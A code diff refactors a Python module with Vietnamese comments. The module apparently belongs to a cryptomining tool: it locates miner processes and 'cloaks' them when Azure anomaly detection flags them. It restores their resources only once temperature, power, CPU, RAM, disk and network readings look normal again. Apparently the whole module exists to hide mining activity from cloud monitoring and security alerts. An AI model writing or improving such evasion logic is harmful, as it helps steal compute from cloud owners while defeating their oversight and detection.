@@ -1,31 +1,47 @@
-# anomaly_detector.py
-
 import psutil
 import logging
 import traceback
 import asyncio
 from asyncio import Event
-from typing import List, Dict, Any, Optional, Union
+from typing import List, Dict, Any
 from threading import Lock
+
+import pynvml
+
 from .base_manager import BaseManager
 from .utils import MiningProcess
 from .auxiliary_modules.power_management import get_cpu_power, get_gpu_power
 from .auxiliary_modules.temperature_monitor import get_cpu_temperature, get_gpu_temperature
-
-# Import Interface
 from .interfaces import IResourceManager
 
 ###############################################################################
-#                  LỚP ĐÁNH GIÁ RESTORE: SafeRestoreEvaluator                 #
+#   QUẢN LÝ NVML TOÀN CỤC CHO MODULE (KHÔNG CÒN GPUManager RIÊNG)            #
+###############################################################################
+
+_nvml_initialized = False
+
+def initialize_nvml():
+    """
+    Khởi tạo pynvml nếu chưa khởi tạo.
+    """
+    global _nvml_initialized
+    if not _nvml_initialized:
+        pynvml.nvmlInit()
+        _nvml_initialized = True
+
+def is_nvml_initialized() -> bool:
+    """Trả về True nếu pynvml đã khởi tạo."""
+    return _nvml_initialized
+
+###############################################################################
+#            LỚP ĐÁNH GIÁ KHẢ NĂNG PHỤC HỒI: SafeRestoreEvaluator             #
 ###############################################################################
 
 class SafeRestoreEvaluator:
     """
     Lớp đánh giá điều kiện an toàn để khôi phục tài nguyên cho tiến trình.
-    *Giữ nguyên logic cũ, chỉ bỏ polling - thay vào khi AnomalyDetector
-     xác định tiến trình đang bị cloaked, sẽ gọi hàm này để kiểm tra
-     xem có đủ an toàn để restore chưa.*
     """
+
     def __init__(self, config: Dict[str, Any], logger: logging.Logger, resource_manager: IResourceManager):
         self.config = config
         self.logger = logger
@@ -52,11 +68,9 @@ class SafeRestoreEvaluator:
 
     async def is_safe_to_restore(self, process: MiningProcess) -> bool:
         """
-        Kiểm tra điều kiện an toàn để khôi phục tài nguyên.
-        Thay vì polling trong vòng lặp, ta chỉ gọi hàm này khi AnomalyDetector
-        xác định rằng chúng ta nên thử restore tiến trình bị cloaked.
+        Kiểm tra các điều kiện an toàn để khôi phục tài nguyên cho tiến trình.
         """
-        # 1) Kiểm tra sự tồn tại
+        # 1) Kiểm tra PID tồn tại
         if not psutil.pid_exists(process.pid):
             self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại.")
             return False
@@ -68,18 +82,20 @@ class SafeRestoreEvaluator:
                 self.logger.info(f"Nhiệt độ CPU {cpu_temp}°C vẫn cao (PID={process.pid}).")
                 return False
         except Exception as e:
-            self.logger.error(f"Lỗi khi kiểm tra nhiệt độ CPU PID={process.pid}: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi kiểm tra nhiệt độ CPU PID={process.pid}: {e}\n{traceback.format_exc()}")
             return False
 
         # 3) Kiểm tra nhiệt độ GPU
         try:
-            if await self.resource_manager.is_gpu_initialized():
-                gpu_temps = await asyncio.get_event_loop().run_in_executor(None, get_gpu_temperature, process.pid)
-                if gpu_temps and any(temp >= self.gpu_max_temp for temp in gpu_temps):
-                    self.logger.info(f"Nhiệt độ GPU {gpu_temps}°C vẫn cao (PID={process.pid}).")
-                    return False
+            if not is_nvml_initialized():
+                initialize_nvml()
+
+            gpu_temps = await asyncio.get_event_loop().run_in_executor(None, get_gpu_temperature, process.pid)
+            if gpu_temps and any(temp >= self.gpu_max_temp for temp in gpu_temps):
+                self.logger.info(f"Nhiệt độ GPU {gpu_temps}°C vẫn cao (PID={process.pid}).")
+                return False
         except Exception as e:
-            self.logger.error(f"Lỗi khi kiểm tra nhiệt độ GPU PID={process.pid}: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi kiểm tra nhiệt độ GPU PID={process.pid}: {e}\n{traceback.format_exc()}")
             return False
 
         # 4) Kiểm tra công suất CPU
@@ -94,17 +110,18 @@ class SafeRestoreEvaluator:
 
         # 5) Kiểm tra công suất GPU
         try:
-            if await self.resource_manager.is_gpu_initialized():
-                gpu_power = await asyncio.get_event_loop().run_in_executor(None, get_gpu_power, process.pid)
-                # Nếu gpu_power là list => check tổng
-                if isinstance(gpu_power, list):
-                    if sum(gpu_power) >= self.gpu_max_power:
-                        self.logger.info(f"Công suất GPU {gpu_power}W vẫn cao (PID={process.pid}).")
-                        return False
-                else:
-                    if gpu_power >= self.gpu_max_power:
-                        self.logger.info(f"Công suất GPU {gpu_power}W vẫn cao (PID={process.pid}).")
-                        return False
+            if not is_nvml_initialized():
+                initialize_nvml()
+
+            gpu_power = await asyncio.get_event_loop().run_in_executor(None, get_gpu_power, process.pid)
+            if isinstance(gpu_power, list):
+                if sum(gpu_power) >= self.gpu_max_power:
+                    self.logger.info(f"Công suất GPU {gpu_power}W vẫn cao (PID={process.pid}).")
+                    return False
+            else:
+                if gpu_power >= self.gpu_max_power:
+                    self.logger.info(f"Công suất GPU {gpu_power}W vẫn cao (PID={process.pid}).")
+                    return False
         except Exception as e:
             self.logger.error(f"Lỗi kiểm tra công suất GPU PID={process.pid}: {e}\n{traceback.format_exc()}")
             return False
@@ -116,7 +133,7 @@ class SafeRestoreEvaluator:
                 self.logger.info(f"Sử dụng CPU tổng thể {total_cpu_usage}% vẫn cao.")
                 return False
         except Exception as e:
-            self.logger.error(f"Lỗi khi kiểm tra CPU tổng thể: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi kiểm tra CPU tổng thể: {e}\n{traceback.format_exc()}")
             return False
 
         # 7) Kiểm tra RAM
@@ -126,7 +143,7 @@ class SafeRestoreEvaluator:
                 self.logger.info(f"Sử dụng RAM tổng thể {ram.percent}% vẫn cao.")
                 return False
         except Exception as e:
-            self.logger.error(f"Lỗi khi kiểm tra RAM tổng thể: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"Lỗi kiểm tra RAM tổng thể: {e}\n{traceback.format_exc()}")
             return False
 
         # 8) Kiểm tra Disk I/O
@@ -143,10 +160,7 @@ class SafeRestoreEvaluator:
         # 9) Kiểm tra mạng
         try:
             net_io_counters = psutil.net_io_counters()
-            total_network_usage_mbps = (
-                (net_io_counters.bytes_sent + net_io_counters.bytes_recv)
-                / (1024 * 1024)
-            )
+            total_network_usage_mbps = (net_io_counters.bytes_sent + net_io_counters.bytes_recv) / (1024 * 1024)
             if total_network_usage_mbps >= self.baseline_network_usage_mbps:
                 self.logger.info(f"Sử dụng mạng {total_network_usage_mbps:.2f} MBps vẫn cao.")
                 return False
@@ -165,25 +179,18 @@ class SafeRestoreEvaluator:
             self.logger.error(f"Lỗi qua Azure Anomaly Detector PID={process.pid}: {e}\n{traceback.format_exc()}")
             return False
 
-        # Nếu tất cả điều kiện OK => trả về True
-        self.logger.info(f"Đủ điều kiện an toàn để khôi phục tài nguyên cho PID={process.pid}.")
+        # Tất cả điều kiện ok => True
+        self.logger.info(f"Đủ điều kiện an toàn để khôi phục cho PID={process.pid}.")
         return True
 
-
 ###############################################################################
-#                   LỚP CHÍNH: AnomalyDetector (SINGLETON)                    #
+#                           LỚP CHÍNH: AnomalyDetector                        #
 ###############################################################################
-
 
 class AnomalyDetector(BaseManager):
     """
-    Lớp phát hiện bất thường cho các tiến trình khai thác.
-    Sử dụng kiểu event-driven:
-      - Thay vì polling liên tục, ta chỉ chạy các coroutine theo lịch
-        hoặc gọi khi ResourceManager push event.
-      - Ở đây vẫn giữ 2 coroutine chính:
-          + anomaly_detection() phát hiện bất thường
-          + monitor_restoration() kiểm tra xem khi nào có thể restore
+    Lớp phát hiện bất thường cho tiến trình khai thác.
+    Sử dụng event-driven thay vì polling liên tục.
     """
     _instance = None
     _instance_lock = Lock()
@@ -196,31 +203,24 @@ class AnomalyDetector(BaseManager):
 
     def __init__(self, config: Dict[str, Any], logger: logging.Logger, resource_manager: IResourceManager):
         BaseManager.__init__(self, config, logger)
+
         if getattr(self, '_initialized', False):
             return
         self._initialized = True
 
         self.logger = logger
         self.config = config
+        self.resource_manager = resource_manager
 
-        # Sự kiện dừng
         self.stop_event = Event()
-
         self.mining_processes: List[MiningProcess] = []
         self.mining_processes_lock = asyncio.Lock()
 
-        # Được truyền qua constructor
-        self.resource_manager: IResourceManager = resource_manager
-        self.safe_restore_evaluator = SafeRestoreEvaluator(
-            self.config,
-            self.logger,
-            self.resource_manager
-        )
+        # Lớp hỗ trợ đánh giá khi nào an toàn để khôi phục
+        self.safe_restore_evaluator = SafeRestoreEvaluator(config, logger, resource_manager)
 
-        # Chứa các task chạy ngầm
+        # Danh sách các task chạy ngầm
         self.task_futures = []
-
-        # Khởi chạy các coroutine chính
         loop = asyncio.get_event_loop()
         self.task_futures.append(loop.create_task(self.anomaly_detection()))
         self.task_futures.append(loop.create_task(self.monitor_restoration()))
@@ -229,8 +229,7 @@ class AnomalyDetector(BaseManager):
 
     async def start(self):
         """
-        Khởi động AnomalyDetector. 
-        Chỉ đơn giản gọi discover_mining_processes_async() ban đầu.
+        Khởi động AnomalyDetector. Gọi discover_mining_processes_async() ban đầu.
         """
         self.logger.info("Đang khởi động AnomalyDetector...")
         await self.discover_mining_processes_async()
@@ -238,87 +237,71 @@ class AnomalyDetector(BaseManager):
 
     async def discover_mining_processes_async(self):
         """
-        Tương tự ResourceManager, tìm các tiến trình khai thác dựa trên config.
+        Tìm các tiến trình khai thác dựa trên config (CPU/GPU).
         """
-        cpu_process_name = self.config['processes'].get('CPU', '').lower()
-        gpu_process_name = self.config['processes'].get('GPU', '').lower()
+        cpu_name = self.config['processes'].get('CPU', '').lower()
+        gpu_name = self.config['processes'].get('GPU', '').lower()
 
         async with self.mining_processes_lock:
             self.mining_processes.clear()
             for proc in psutil.process_iter(['pid', 'name']):
                 try:
                     proc_name = proc.info['name'].lower()
-                    if cpu_process_name in proc_name or gpu_process_name in proc_name:
+                    if cpu_name in proc_name or gpu_name in proc_name:
                         priority = self.get_process_priority(proc.info['name'])
-                        network_interface = self.config.get('network_interface', 'eth0')
-                        mining_proc = MiningProcess(
-                            proc.info['pid'],
-                            proc.info['name'],
-                            priority,
-                            network_interface,
-                            self.logger
-                        )
-                        mining_proc.is_cloaked = False
-                        self.mining_processes.append(mining_proc)
+                        net_if = self.config.get('network_interface', 'eth0')
+                        mp = MiningProcess(proc.info['pid'], proc.info['name'], priority, net_if, self.logger)
+                        mp.is_cloaked = False
+                        self.mining_processes.append(mp)
                 except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                     continue
 
             self.logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")
 
     def get_process_priority(self, process_name: str) -> int:
-        """
-        Lấy độ ưu tiên dựa trên config (giữ nguyên logic).
-        """
+        """Lấy độ ưu tiên của tiến trình dựa trên config."""
         priority_map = self.config.get('process_priority_map', {})
-        priority = priority_map.get(process_name.lower(), 1)
-        if not isinstance(priority, int):
-            self.logger.warning(
-                f"Độ ưu tiên cho tiến trình '{process_name}' không phải int => gán = 1."
-            )
-            priority = 1
-        return priority
+        val = priority_map.get(process_name.lower(), 1)
+        if not isinstance(val, int):
+            self.logger.warning(f"Độ ưu tiên của '{process_name}' không phải int => gán = 1.")
+            return 1
+        return val
 
     ##########################################################################
-    #                    PHÁT HIỆN BẤT THƯỜNG & ENQUEUE CLOAKING             #
+    #                           PHÁT HIỆN BẤT THƯỜNG                          #
     ##########################################################################
 
     async def anomaly_detection(self):
         """
-        Coroutine chính để phát hiện bất thường.
-        Thay vì vòng lặp lớn, ta có thể thiết lập interval cho dễ (vẫn là async),
-        hoặc gắn vào 1 cơ chế schedule event. Ở đây ta vẫn dùng interval tối thiểu
-        để tránh spam.
+        Coroutine chính để phát hiện bất thường cho các tiến trình.
         """
         detection_interval = self.config.get("monitoring_parameters", {}).get("detection_interval_seconds", 3600)
-        cloak_activation_delay = self.config.get("monitoring_parameters", {}).get("cloak_activation_delay_seconds", 5)
+        cloak_delay = self.config.get("monitoring_parameters", {}).get("cloak_activation_delay_seconds", 5)
 
         while not self.stop_event.is_set():
             try:
-                # Update danh sách tiến trình
                 await self.discover_mining_processes_async()
 
                 if not self.resource_manager:
-                    self.logger.error("ResourceManager chưa được thiết lập - không thể detect anomalies.")
+                    self.logger.error("ResourceManager chưa được thiết lập.")
                 else:
-                    # Sao chép danh sách cục bộ
                     async with self.mining_processes_lock:
                         processes = list(self.mining_processes)
 
-                    tasks = []
-                    for process in processes:
-                        tasks.append(self.evaluate_process_anomaly(process, cloak_activation_delay))
+                    tasks = [
+                        self.evaluate_process_anomaly(proc, cloak_delay)
+                        for proc in processes
+                    ]
                     await asyncio.gather(*tasks)
 
             except Exception as e:
-                self.logger.error(f"Lỗi trong anomaly_detection: {e}\n{traceback.format_exc()}")
+                self.logger.error(f"Lỗi anomaly_detection: {e}\n{traceback.format_exc()}")
 
-            # Nghỉ cho đến lần kiểm tra tiếp theo
+            # Nghỉ cho đến lần quét tiếp theo
             await asyncio.sleep(detection_interval)
 
-    async def evaluate_process_anomaly(self, process: MiningProcess, cloak_activation_delay: int):
-        """
-        Đánh giá 1 tiến trình, nếu phát hiện bất thường => enqueue cloaking.
-        """
+    async def evaluate_process_anomaly(self, process: MiningProcess, cloak_delay: int):
+        """Đánh giá một tiến trình, nếu phát hiện bất thường => enqueue cloaking."""
         try:
             if not psutil.pid_exists(process.pid):
                 self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại.")
@@ -327,27 +310,19 @@ class AnomalyDetector(BaseManager):
             if not self.resource_manager:
                 return
 
-            # 1) Phát hiện bất thường qua Azure Anomaly Detector
             current_state = await self.resource_manager.collect_metrics(process)
             anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
             if anomalies_detected:
-                self.logger.warning(
-                    f"Phát hiện bất thường trong {process.name} (PID={process.pid}). Cloak sau {cloak_activation_delay} giây."
-                )
-                await asyncio.sleep(cloak_activation_delay)
+                self.logger.warning(f"Phát hiện bất thường {process.name} (PID={process.pid}). Cloak sau {cloak_delay}s.")
+                await asyncio.sleep(cloak_delay)
                 await self.enqueue_cloaking(process)
                 process.is_cloaked = True
-
-            # 2) Kiểm tra Sentinel Alerts (nếu cần), logic cũ đã comment
-            # 3) Kiểm tra AML logs (nếu cần), logic cũ đã comment
 
         except Exception as e:
             self.logger.error(f"Lỗi evaluate_process_anomaly PID={process.pid}: {e}\n{traceback.format_exc()}")
 
     async def enqueue_cloaking(self, process: MiningProcess):
-        """
-        Thêm tiến trình vào queue ResourceManager để cloak.
-        """
+        """Thêm tiến trình vào queue ResourceManager để cloak."""
         try:
             await self.resource_manager.enqueue_cloaking(process)
             self.logger.info(f"Đã enqueue cloaking cho {process.name} (PID={process.pid}).")
@@ -355,9 +330,7 @@ class AnomalyDetector(BaseManager):
             self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")
 
     async def enqueue_restoration(self, process: MiningProcess):
-        """
-        Thêm tiến trình vào queue ResourceManager để restore.
-        """
+        """Thêm tiến trình vào queue ResourceManager để khôi phục."""
         try:
             await self.resource_manager.enqueue_restoration(process)
             self.logger.info(f"Đã enqueue khôi phục cho {process.name} (PID={process.pid}).")
@@ -365,45 +338,43 @@ class AnomalyDetector(BaseManager):
             self.logger.error(f"Không thể enqueue restore PID={process.pid}: {e}\n{traceback.format_exc()}")
 
     ##########################################################################
-    #                 GIÁM SÁT ĐIỀU KIỆN VÀ KHÔI PHỤC TÀI NGUYÊN            #
+    #                    GIÁM SÁT ĐIỀU KIỆN PHỤC HỒI TÀI NGUYÊN              #
     ##########################################################################
 
     async def monitor_restoration(self):
         """
-        Coroutine để xử lý phục hồi tài nguyên cho các tiến trình đã cloaked.
-        Thay vì polling liên tục, ta vẫn đặt interval cho gọn.
+        Coroutine để khôi phục tài nguyên cho các tiến trình đã bị cloak,
+        nếu đạt điều kiện an toàn. 
         """
-        interval = 60  # mỗi 60 giây kiểm tra 1 lần
+        interval = 60
         while not self.stop_event.is_set():
             try:
                 async with self.mining_processes_lock:
-                    cloaked_processes = [proc for proc in self.mining_processes if getattr(proc, 'is_cloaked', False)]
+                    cloaked = [p for p in self.mining_processes if getattr(p, 'is_cloaked', False)]
 
-                if self.safe_restore_evaluator and cloaked_processes:
-                    tasks = []
-                    for process in cloaked_processes:
-                        tasks.append(self.safe_restore_evaluator.is_safe_to_restore(process))
+                if self.safe_restore_evaluator and cloaked:
+                    tasks = [self.safe_restore_evaluator.is_safe_to_restore(p) for p in cloaked]
                     results = await asyncio.gather(*tasks)
 
-                    for process, is_safe in zip(cloaked_processes, results):
-                        if is_safe:
-                            self.logger.info(f"Đủ điều kiện khôi phục cho PID={process.pid}.")
-                            await self.enqueue_restoration(process)
-                            process.is_cloaked = False
-                            self.logger.info(f"Đã khôi phục tài nguyên cho {process.name} (PID={process.pid}).")
+                    for proc, safe in zip(cloaked, results):
+                        if safe:
+                            self.logger.info(f"Đủ điều kiện khôi phục cho PID={proc.pid}.")
+                            await self.enqueue_restoration(proc)
+                            proc.is_cloaked = False
+                            self.logger.info(f"Đã khôi phục tài nguyên cho {proc.name} (PID={proc.pid}).")
 
             except Exception as e:
-                self.logger.error(f"Lỗi trong monitor_restoration: {e}\n{traceback.format_exc()}")
+                self.logger.error(f"Lỗi monitor_restoration: {e}\n{traceback.format_exc()}")
 
             await asyncio.sleep(interval)
 
     async def stop(self):
-        """
-        Dừng AnomalyDetector: huỷ các task ngầm.
-        """
+        """Dừng AnomalyDetector, hủy các task ngầm."""
         self.logger.info("Đang dừng AnomalyDetector...")
         self.stop_event.set()
+
         for t in self.task_futures:
             t.cancel()
         await asyncio.gather(*self.task_futures, return_exceptions=True)
+
         self.logger.info("AnomalyDetector đã dừng thành công.")
